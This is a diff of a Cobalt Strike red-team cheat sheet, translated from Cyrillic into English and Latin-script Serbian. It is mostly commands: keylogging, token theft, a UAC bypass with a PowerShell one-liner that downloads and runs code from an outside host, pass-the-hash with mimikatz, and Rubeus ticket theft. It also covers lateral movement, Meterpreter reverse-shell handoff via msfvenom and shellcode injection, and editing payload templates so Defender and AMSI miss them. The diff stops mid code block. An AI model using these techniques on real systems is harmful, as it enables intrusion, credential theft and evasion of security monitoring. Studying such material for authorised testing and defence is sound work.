@@ -1,189 +1,206 @@
 # Cobalt Strike
 
-### Слушаоци
+### Listeners
 
-### C2 Слушаоци
+### C2 Listeners
 
-`Cobalt Strike -> Слушаоци -> Додај/Уреди` затим можете изабрати где слушати, коју врсту бикона користити (http, dns, smb...) и више.
+`Cobalt Strike -> Listeners -> Add/Edit` zatim možete odabrati gde da slušate, koju vrstu beacon-a da koristite (http, dns, smb...) i još mnogo toga.
 
-### Peer2Peer Слушаоци
+### Peer2Peer Listeners
 
-Бикони ових слушаоца не морају директно комуницирати са C2, могу комуницирати преко других бикона.
+Beaconi ovih slušalaca ne moraju direktno da komuniciraju sa C2, mogu da komuniciraju sa njim preko drugih beacon-a.
 
-`Cobalt Strike -> Слушаоци -> Додај/Уреди` затим морате изабрати TCP или SMB биконе
+`Cobalt Strike -> Listeners -> Add/Edit` zatim treba da odaberete TCP ili SMB beacone
 
-* **TCP бикон ће поставити слушаоца на изабраном порту**. За повезивање са TCP биконом користите команду `connect <ip> <port>` са другог бикона
-* **smb бикон ће слушати на пипе са изабраним именом**. За повезивање са SMB биконом морате користити команду `link [target] [pipe]`.
+* **TCP beacon će postaviti slušalac na odabranom portu**. Da biste se povezali na TCP beacon, koristite komandu `connect <ip> <port>` iz drugog beacon-a
+* **smb beacon će slušati na pipename-u sa odabranim imenom**. Da biste se povezali na SMB beacon, morate koristiti komandu `link [target] [pipe]`.
 
-### Генерише и хостује пакете
+### Generate & Host payloads
 
-#### Генерише пакете у датотекама
+#### Generate payloads in files
 
-`Напади -> Пакети ->`&#x20;
+`Attacks -> Packages ->`&#x20;
 
-* **`HTMLApplication`** за HTA датотеке
-* **`MS Office Macro`** за офисни документ са макром
-* **`Windows Executable`** за .exe, .dll или сервис .exe
-* **`Windows Executable (S)`** за **stageless** .exe, .dll или сервис .exe (боље stageless него staged, мање IoC-ова)
+* **`HTMLApplication`** za HTA datoteke
+* **`MS Office Macro`** za kancelarijski dokument sa makroom
+* **`Windows Executable`** za .exe, .dll ili servis .exe
+* **`Windows Executable (S)`** za **stageless** .exe, .dll ili servis .exe (bolje stageless nego staged, manje IoCs)
 
-#### Генерише и хостује пакете
+#### Generate & Host payloads
 
-`Напади -> Веб Drive-by -> Скриптована Испорука преко Веба (S)` Ово ће генерисати скрипту/извршни документ за преузимање бикона са Cobalt Strike у форматима као што су: bitsadmin, exe, powershell и python
+`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Ovo će generisati skriptu/izvršni fajl za preuzimanje beacon-a iz cobalt strike-a u formatima kao što su: bitsadmin, exe, powershell i python
 
-#### Хостује пакете
+#### Host Payloads
 
-Ако већ имате датотеку коју желите да хостујете на веб серверу, само идите на `Напади -> Веб Drive-by -> Хостуј датотеку` и изаберите датотеку за хостовање и конфигурацију веб сервера.
+Ako već imate datoteku koju želite da hostujete na web serveru, samo idite na `Attacks -> Web Drive-by -> Host File` i odaberite datoteku za hostovanje i konfiguraciju web servera.
 
-### Опције бикона
+### Beacon Options
 
-<pre class="language-bash"><code class="lang-bash"># Изврши локални .NET бинарни фајл
+<pre class="language-bash"><code class="lang-bash"># Execute local .NET binary
 execute-assembly &#x3C;/path/to/executable.exe>
 
-# Снимци екрана
-printscreen    # Направи један снимак екрана помоћу PrintScr методе
-screenshot     # Направи један снимак екрана
-screenwatch    # Периодично прави снимке екрана
-## Идите на Приказ -> Снимци екрана да их видите
+# Screenshots
+printscreen    # Napravite jedan screenshot putem PrintScr metode
+screenshot     # Napravite jedan screenshot
+screenwatch    # Napravite periodične screenshot-ove desktop-a
+## Idite na View -> Screenshots da ih vidite
 
 # keylogger
 keylogger [pid] [x86|x64]
-## Приказ > Притиснуте тастере да видите притиснуте тастере
+## View > Keystrokes da vidite pritisnute tastere
 
 # portscan
-portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Убаци акцију скенирања порта у други процес
+portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Umetnite portscan akciju unutar drugog procesa
 portscan [targets] [ports] [arp|icmp|none] [max connections]
 
 # Powershell
-# Увези Powershell модул
+# Import Powershell module
 powershell-import C:\path\to\PowerView.ps1
-powershell &#x3C;овде унесите powershell команду>
+powershell &#x3C;just write powershell cmd here>
 
-# Имитација корисника
-## Генеришење токена са креденцијалима
-make_token [DOMAIN\user] [password] #Креирај токен за имитирање корисника у мрежи
-ls \\computer_name\c$ # Покушај коришћења генерисаног токена за приступ C$ на рачунару
-rev2self # Престани користити токен генерисан са make_token
-## Коришћење make_token генерише догађај 4624: Налог је успешно пријављен. Овај догађај је веома чест у Windows домену, али се може сужавати филтрирањем по типу пријаве. Као што је поменуто, користи LOGON32_LOGON_NEW_CREDENTIALS који је тип 9.
+# User impersonation
+## Token generation with creds
+make_token [DOMAIN\user] [password] #Kreirajte token za impersonaciju korisnika u mreži
+ls \\computer_name\c$ # Pokušajte da koristite generisani token za pristup C$ na računaru
+rev2self # Prestanite da koristite token generisan sa make_token
+## Korišćenje make_token generiše događaj 4624: Račun je uspešno prijavljen. Ovaj događaj je veoma čest u Windows domenima, ali se može suziti filtriranjem po tipu prijave. Kao što je pomenuto, koristi LOGON32_LOGON_NEW_CREDENTIALS koji je tip 9.
 
 # UAC Bypass
-elevate svc-exe &#x3C;слушаоц>
-elevate uac-token-duplication &#x3C;слушаоц>
+elevate svc-exe &#x3C;listener>
+elevate uac-token-duplication &#x3C;listener>
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 
-## Укради токен из pid-а
-## Као make_token, али краде токен из процеса
-steal_token [pid] # Такође, ово је корисно за мрежне акције, а не локалне акције
-## Из документације API-ја знамо да овај тип пријаве "омогућава позиваоцу да клонира свој тренутни токен". Зато Beacon исписује Impersonated &#x3C;current_username> - имитира наш клонирани токен.
-ls \\computer_name\c$ # Покушај коришћења генерисаног токена за приступ C$ на рачунару
-rev2self # Престани користити токен из steal_token
+## Steal token from pid
+## Kao make_token, ali krade token iz procesa
+steal_token [pid] # Takođe, ovo je korisno za mrežne akcije, ne lokalne akcije
+## Iz API dokumentacije znamo da ovaj tip prijave "omogućava pozivaocu da klonira svoj trenutni token". Zato izlaz Beacon-a kaže Impersonated &#x3C;current_username> - impersonuje naš vlastiti klonirani token.
+ls \\computer_name\c$ # Pokušajte da koristite generisani token za pristup C$ na računaru
+rev2self # Prestanite da koristite token iz steal_token
 
-## Покрени процес са новим креденцијалима
-spawnas [domain\username] [password] [listener] #Урадите то из директоријума са приступом за читање као: cd C:\
-## Као make_token, ово ће генерисати Windows догађај 4624: Налог је успешно пријављен, али са типом пријаве 2 (LOGON32_LOGON_INTERACTIVE). Детаљно ће бити наведен позиваоц (TargetUserName) и имитирани корисник (TargetOutboundUserName).
+## Launch process with nwe credentials
+spawnas [domain\username] [password] [listener] #Uradite to iz direktorijuma sa pristupom za čitanje kao: cd C:\
+## Kao make_token, ovo će generisati Windows događaj 4624: Račun je uspešno prijavljen, ali sa tipom prijave 2 (LOGON32_LOGON_INTERACTIVE). Detaljno će prikazati korisnika koji poziva (TargetUserName) i impersoniranog korisnika (TargetOutboundUserName).
 
-## Убаци у процес
+## Inject into process
 inject [pid] [x64|x86] [listener]
-## Са аспекта ОпСек-а: Не врши убацивање између различитих платформи осим ако заиста морате (нпр. x86 -> x64 или x64 -> x86).
+## Iz OpSec tačke gledišta: Ne vršite cross-platform injekciju osim ako zaista ne morate (npr. x86 -> x64 ili x64 -> x86).
 
-## Пренеси хеш
-## Овај процес измене захтева патчовање меморије LSASS што је акција високог ризика, захтева привилегије локалног администратора и није све то изводљиво ако је омогућено Заштићено Процесно Светло (PPL).
+## Pass the hash
+## Ovaj proces modifikacije zahteva patch-ovanje LSASS memorije što je visoko rizična akcija, zahteva lokalne admin privilegije i nije baš izvodljivo ako je omogućena Protected Process Light (PPL).
 pth [pid] [arch] [DOMAIN\user] [NTLM hash]
 pth [DOMAIN\user] [NTLM hash]
 
-## Пренеси хеш преко mimikatz-a
+## Pass the hash through mimikatz
 mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
-## Без /run, mimikatz покреће cmd.exe, ако користите као корисник са Радном површином, видеће шел (ако користите као СИСТЕМ, све је у реду)
-steal_token &#x3C;pid> #Укради токен из процеса који је креирао mimikatz
+## Bez /run, mimikatz pokreće cmd.exe, ako se pokrećete kao korisnik sa Desktop-om, on će videti shell (ako se pokrećete kao SYSTEM, možete nastaviti)
+steal_token &#x3C;pid> #Kradite token iz procesa koji je kreirao mimikatz
 
-## Пренеси тикет
-## Захтевај тикет
-execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain>
-### Kreiranje nove sesije za prijavljivanje, zabeležite luid i processid
-execute-assembly C:\putanja\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
-### Ubacite karticu u generisanu sesiju za prijavljivanje
-execute-assembly C:\putanja\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
+## Pass the ticket
+## Zatražite tiket
+execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
+## Kreirajte novu sesiju prijave za korišćenje sa novim tiketom (da ne prepišete kompromitovani)
+make_token &#x3C;domain>\&#x3C;username> DummyPass
+## Napišite tiket na mašini napadača iz powershell sesije &#x26; učitajte ga
+[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
+kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
+
+## Pass the ticket from SYSTEM
+## Generišite novi proces sa tiketom
+execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
+## Ukradite token iz tog procesa
+steal_token &#x3C;pid>
+
+## Extract ticket + Pass the ticket
+### List tickets
+execute-assembly C:\path\Rubeus.exe triage
+### Dump insteresting ticket by luid
+execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
+### Create new logon session, note luid and processid
+execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
+### Insert ticket in generate logon session
+execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
 ### Na kraju, ukradite token iz tog novog procesa
 steal_token &#x3C;pid>
 
-# Lateralno kretanje
+# Lateral Movement
 ## Ako je token kreiran, biće korišćen
-jump [metoda] [cilj] [slušalac]
+jump [method] [target] [listener]
 ## Metode:
-## psexec                    x86   Koristi uslugu za pokretanje artefakta Service EXE
-## psexec64                  x64   Koristi uslugu za pokretanje artefakta Service EXE
-## psexec_psh                x86   Koristi uslugu za pokretanje PowerShell jednolinije
-## winrm                     x86   Pokreće PowerShell skriptu putem WinRM-a
-## winrm64                   x64   Pokreće PowerShell skriptu putem WinRM-a
+## psexec                    x86   Koristite servis za pokretanje Service EXE artefakta
+## psexec64                  x64   Koristite servis za pokretanje Service EXE artefakta
+## psexec_psh                x86   Koristite servis za pokretanje PowerShell one-liner-a
+## winrm                     x86   Pokrenite PowerShell skriptu putem WinRM
+## winrm64                   x64   Pokrenite PowerShell skriptu putem WinRM
 
-remote-exec [metoda] [cilj] [komanda]
+remote-exec [method] [target] [command]
 ## Metode:
 <strong>## psexec                          Daljinsko izvršavanje putem Service Control Manager-a
-</strong>## winrm                           Daljinsko izvršavanje putem WinRM-a (PowerShell)
-## wmi                             Daljinsko izvršavanje putem WMI-a
+</strong>## winrm                           Daljinsko izvršavanje putem WinRM (PowerShell)
+## wmi                             Daljinsko izvršavanje putem WMI
 
-## Da biste izvršili beacon sa wmi (nije u jump komandi), samo otpremite beacon i izvršite ga
+## Da biste izvršili beacon sa wmi (nije u jump komandi) samo otpremite beacon i izvršite ga
 beacon> upload C:\Payloads\beacon-smb.exe
 beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
 
 
-# Prosledi sesiju Metasploitu - Putem slušaoca
-## Na Metasploit hostu
+# Pass session to Metasploit - Through listener
+## Na metaploit hostu
 msf6 > use exploit/multi/handler
 msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
 msf6 exploit(multi/handler) > set LHOST eth0
 msf6 exploit(multi/handler) > set LPORT 8080
 msf6 exploit(multi/handler) > exploit -j
 
-## Na Cobalt: Slušaoci > Dodaj i postavi Payload na Foreign HTTP. Postavi Host na 10.10.5.120, Port na 8080 i klikni Sačuvaj.
+## Na cobalt: Listeners > Add i postavite Payload na Foreign HTTP. Postavite Host na 10.10.5.120, Port na 8080 i kliknite na Save.
 beacon> spawn metasploit
-## Možete spawn-ovati samo x86 Meterpreter sesije sa foreign slušaocem.
+## Možete samo pokrenuti x86 Meterpreter sesije sa stranim slušateljem.
 
-# Prosledi sesiju Metasploitu - Putem ubrizgavanja shellcode-a
-## Na Metasploit hostu
+# Pass session to Metasploit - Through shellcode injection
+## Na metasploit hostu
 msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
-## Pokreni msfvenom i pripremi multi/handler slušaoca
+## Pokrenite msfvenom i pripremite multi/handler slušalac
 
-## Kopiraj bin fajl na Cobalt Strike host
+## Kopirajte bin datoteku na cobalt strike host
 ps
-shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Ubrizgaj metasploit shellcode u x64 proces
+shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Injektujte metasploit shellcode u x64 proces
 
-# Prosledi metasploit sesiju Cobalt Strike-u
-## Generiši stageless Beacon shellcode, idi na Attacks > Packages > Windows Executable (S), izaberi željeni slušalac, izaberi Raw kao Output tip i izaberi Use x64 payload.
-## Koristi post/windows/manage/shellcode_inject u metasploit-u da ubrizgaš generisani cobalt strike shellcode
+# Pass metasploit session to cobalt strike
+## Generišite stageless Beacon shellcode, idite na Attacks > Packages > Windows Executable (S), odaberite željeni slušalac, odaberite Raw kao tip izlaza i odaberite Use x64 payload.
+## Koristite post/windows/manage/shellcode_inject u metaspolitu da injektujete generisani cobalt strike shellcode
 
 
 # Pivoting
-## Otvori socks proxy na teamserveru
+## Otvorite socks proxy u teamserver-u
 beacon> socks 1080
 
-# SSH konekcija
-beacon> ssh 10.10.17.12:22 korisničko_ime lozinka</code></pre>
+# SSH connection
+beacon> ssh 10.10.17.12:22 username password</code></pre>
 
-## Izbegavanje AV-a
+## Avoiding AVs
 
 ### Artifact Kit
 
-Obično u `/opt/cobaltstrike/artifact-kit` možete pronaći kod i prekompilirane šablone (u `/src-common`) payloada koje će cobalt strike koristiti za generisanje binarnih beacona.
+Obično u `/opt/cobaltstrike/artifact-kit` možete pronaći kod i prethodno kompajlirane šablone (u `/src-common`) payload-a koje cobalt strike koristi za generisanje binarnih beacon-a.
 
-Koristeći [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) sa generisanim backdoorom (ili samo sa kompiliranim šablonom) možete pronaći šta pokreće defender. Obično je to string. Stoga jednostavno izmenite kod koji generiše backdoor tako da taj string ne bude prisutan u finalnom binarnom fajlu.
+Korišćenjem [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) sa generisanim backdoor-om (ili samo sa kompajliranim šablonom) možete otkriti šta uzrokuje aktivaciju defendera. Obično je to string. Stoga možete samo modifikovati kod koji generiše backdoor tako da taj string ne pojavi u konačnom binarnom fajlu.
 
-Nakon izmene koda, pokrenite `./build.sh` iz istog direktorijuma i kopirajte `dist-pipe/` folder na Windows klijentu u `C:\Tools\cobaltstrike\ArtifactKit`.
+Nakon modifikacije koda, samo pokrenite `./build.sh` iz istog direktorijuma i kopirajte `dist-pipe/` folder u Windows klijent u `C:\Tools\cobaltstrike\ArtifactKit`.
 ```
 pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 ```
-Ne zaboravite da učitate agresivni skript `dist-pipe\artifact.cna` kako biste Cobalt Strike-u pokazali da koristi resurse sa diska koje želimo, a ne one koji su učitani.
+Ne zaboravite da učitate agresivni skript `dist-pipe\artifact.cna` kako biste naznačili Cobalt Strike-u da koristi resurse sa diska koje želimo, a ne one koji su učitani.
 
 ### Resource Kit
 
-Folder ResourceKit sadrži predloške za skriptne payload-e Cobalt Strike-a, uključujući PowerShell, VBA i HTA.
+Folder ResourceKit sadrži šablone za Cobalt Strike-ove skriptne payload-e uključujući PowerShell, VBA i HTA.
 
-Korišćenjem [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) sa predlošcima možete pronaći šta se ne sviđa zaštitniku (u ovom slučaju AMSI) i izmeniti to:
+Koristeći [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) sa šablonima možete pronaći šta defender (AMSI u ovom slučaju) ne voli i modifikovati to:
 ```
 .\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
 ```
-Modifikovanjem detektovanih linija može se generisati šablon koji neće biti uhvaćen.
+Modifikovanjem otkrivenih linija može se generisati šablon koji neće biti uhvaćen.
 
-Ne zaboravite da učitate agresivni skriptu `ResourceKit\resources.cna` kako biste Cobalt Strike-u pokazali da koristite resurse sa diska koje želite, a ne one koji su učitani.
+Ne zaboravite da učitate agresivni skript `ResourceKit\resources.cna` kako biste naznačili Cobalt Strike-u da koristi resurse sa diska koje želimo, a ne one koje su učitane.
 ```bash
 cd C:\Tools\neo4j\bin
 neo4j.bat console
